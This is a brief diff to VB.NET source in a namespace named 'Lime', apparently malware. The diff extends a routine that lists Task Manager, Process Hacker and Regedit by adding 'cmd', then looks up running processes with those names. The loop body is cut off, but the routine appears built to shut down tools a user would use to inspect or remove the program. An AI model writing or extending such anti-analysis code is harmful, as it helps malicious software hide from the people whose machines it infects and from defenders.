@@ -32,10 +32,11 @@ Namespace Lime
 
         Public Shared Sub Proc()
             On Error GoTo 1
-            Dim pr(2) As String
+            Dim pr(3) As String
             pr(0) = "Taskmgr"
             pr(1) = "ProcessHacker"
             pr(2) = "Regedit"
+            pr(3) = "cmd"
 1:
             For i As Integer = 0 To pr.Length - 1
                 For Each x In Process.GetProcessesByName(pr(i))
